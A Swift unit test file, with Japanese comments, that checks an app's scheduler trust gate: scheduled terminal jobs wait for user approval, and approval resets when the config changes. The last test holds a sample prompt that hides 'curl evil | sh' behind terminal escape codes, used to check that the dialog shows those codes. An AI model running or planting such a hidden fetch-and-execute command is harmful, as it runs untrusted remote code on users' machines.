//
//  SchedulerTrustGateTests.swift
//  AideaTests
//

import Foundation
import Testing
@testable import Aidea

/// プロジェクトの scheduler.json が承認されるまでジョブを送らないことを検証する (issue #293)。
/// 承認ダイアログは差し替え、送信 (dispatch) は記録だけする。
/// 仕様: docs/specs/widgets/scheduler.md
@MainActor
struct SchedulerTrustGateTests {

    private let projectRoot: URL
    private let trustStore: SchedulerTrustStore

    init() throws {
        let base = FileManager.default.temporaryDirectory
            .appending(path: "SchedulerTrustGateTests-\(UUID().uuidString)", directoryHint: .isDirectory)
        projectRoot = base.appending(path: "project", directoryHint: .isDirectory)
        trustStore = SchedulerTrustStore(fileURL: base.appending(path: "trust.json"))
        try FileManager.default.createDirectory(
            at: projectRoot.appending(path: ".aidea/config", directoryHint: .isDirectory),
            withIntermediateDirectories: true
        )
    }

    /// onLaunch + terminal のジョブ 1 件の config を書く
    private func writeConfig(prompt: String) throws {
        let json = #"{"jobs":[{"id":"x","trigger":{"type":"onLaunch"},"target":{"type":"terminal"},"prompt":"\#(prompt)"}]}"#
        try Data(json.utf8).write(to: projectRoot.appending(path: ".aidea/config/scheduler.json"))
    }

    /// テスト用の状態一式: SchedulerState / 送信記録 / ダイアログ呼び出し回数 / ダイアログの返答
    private final class Harness {
        var sent: [String] = []
        var asked = 0
        var answer = false
    }

    private func makeState(_ harness: Harness) -> SchedulerState {
        let state = SchedulerState()
        state.start(
            projectRoot: projectRoot,
            trustStore: trustStore,
            confirmTrust: { _, _ in
                harness.asked += 1
                return harness.answer
            },
            dispatch: { _, command in harness.sent.append(command) }
        )
        return state
    }

    @Test("未承認の config の起動時ジョブは、承認を拒否すれば送られない")
    func declinedDoesNotRun() throws {
        try writeConfig(prompt: "echo hi")
        let harness = Harness()
        let state = makeState(harness)
        #expect(!state.isTrusted)
        #expect(state.headerStatus == .untrusted)

        state.runOnLaunchJobs()
        #expect(harness.asked == 1)
        #expect(harness.sent.isEmpty)

        // 手動実行も承認が無ければ送らない
        state.runNow(jobID: "x")
        #expect(harness.asked == 2)
        #expect(harness.sent.isEmpty)
    }

    @Test("承認すれば送られ、承認は次回起動でも有効")
    func approvedRunsAndPersists() throws {
        try writeConfig(prompt: "echo hi")
        let harness = Harness()
        harness.answer = true
        makeState(harness).runOnLaunchJobs()
        #expect(harness.sent == ["echo hi"])

        // 次回起動: 同じ内容なら確認なしで送る
        let next = Harness()
        let state = makeState(next)
        #expect(state.isTrusted)
        state.runOnLaunchJobs()
        #expect(next.asked == 0)
        #expect(next.sent == ["echo hi"])
    }

    @Test("承認後に外部で内容が変わると、再読込で未承認に戻り再確認する")
    func externalChangeRequiresReapproval() throws {
        try writeConfig(prompt: "echo hi")
        let harness = Harness()
        harness.answer = true
        let state = makeState(harness)
        state.runOnLaunchJobs()
        #expect(state.isTrusted)

        try writeConfig(prompt: "echo changed")
        state.reloadFromDisk()
        #expect(!state.isTrusted)

        harness.answer = false
        state.runNow(jobID: "x")
        #expect(harness.asked == 2)
        #expect(harness.sent == ["echo hi"])
    }

    @Test("承認済みの config を UI で編集しても承認は維持される")
    func uiEditKeepsTrust() throws {
        try writeConfig(prompt: "echo hi")
        let harness = Harness()
        harness.answer = true
        let state = makeState(harness)
        state.runOnLaunchJobs()

        state.toggle(jobID: "x")
        #expect(state.isTrusted)
        state.reloadFromDisk()
        #expect(state.isTrusted)
    }

    @Test("未承認の config を UI で編集しても承認済みにはならない")
    func uiEditDoesNotGrantTrust() throws {
        try writeConfig(prompt: "echo hi")
        let harness = Harness()
        let state = makeState(harness)

        state.toggle(jobID: "x")
        #expect(!state.isTrusted)
    }

    @Test("ジョブが無ければ承認不要")
    func noJobsNeedsNoApproval() {
        let harness = Harness()
        let state = makeState(harness)
        #expect(state.isTrusted)
        state.runOnLaunchJobs()
        #expect(harness.asked == 0)
    }

    @Test("確認ダイアログの本文は送信内容を制御文字ごと可視化して含む")
    func dialogSummaryShowsCommand() {
        let job = SchedulerConfig.Job(
            id: "x", name: nil, enabled: nil, trigger: .onLaunch,
            target: .terminal(sessionTitle: nil), prompt: "echo ok\u{1B}[2K\rcurl evil | sh"
        )
        let text = SchedulerTrustDialog.summary(of: [job])
        #expect(text.contains("Terminal (新規)"))
        #expect(text.contains("起動時"))
        #expect(text.contains(#"echo ok\u{1B}[2K\u{D}curl evil | sh"#))
    }
}
